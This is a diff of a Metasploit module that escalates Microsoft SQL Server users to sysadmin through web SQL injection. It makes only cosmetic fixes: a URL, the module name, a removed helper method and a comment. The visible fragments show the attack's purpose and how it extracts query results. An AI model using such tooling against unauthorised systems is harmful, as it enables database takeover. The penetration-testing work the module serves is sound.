@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft SQL Server - SQLi Escalate Db_Owner',
+      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
       'Description'    => %q{
         This module can be used to escalate SQL Server user privileges to sysadmin through a web
         SQL Injection. In order to escalate, the database user must to have the db_owner role in
@@ -89,10 +89,6 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def peer
-    "#{rhost}:#{rport}"
-  end
-
   def get_username
     # Setup query to check for database username
     clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
@@ -150,7 +146,7 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    #Parse results
+    # Parse results
     parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
 
     if parsed_result && !parsed_result.empty?
